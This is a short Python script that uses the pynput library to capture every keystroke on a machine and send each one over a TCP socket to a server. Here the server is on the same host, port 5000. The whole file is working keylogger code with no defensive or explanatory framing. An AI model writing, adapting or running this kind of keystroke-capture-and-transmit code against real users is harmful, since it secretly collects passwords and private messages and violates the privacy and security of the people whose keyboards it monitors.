from pynput import keyboard
from pynput.keyboard import Key
import socket

host = socket.gethostname()  # as both code is running on same pc
port = 5000  # socket server port number

client_socket = socket.socket()  # instantiate
client_socket.connect((host, port))  # connect to the server


def keyPressed(key):
    print(str(key))

    try:
        if(key == Key.space):
            client_socket.send(" ".encode())
        elif(key == Key.enter):
            client_socket.send(" [Enter]".encode())
        elif(key == Key.backspace):
            client_socket.send(" [Backspace]".encode())
        else:
            char = key.char
            client_socket.send(char.encode())
    except:
        print("Error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed) # keyboard listener
    listener.start() # start the listener
    input() # instead of the program ending it will always wait for input
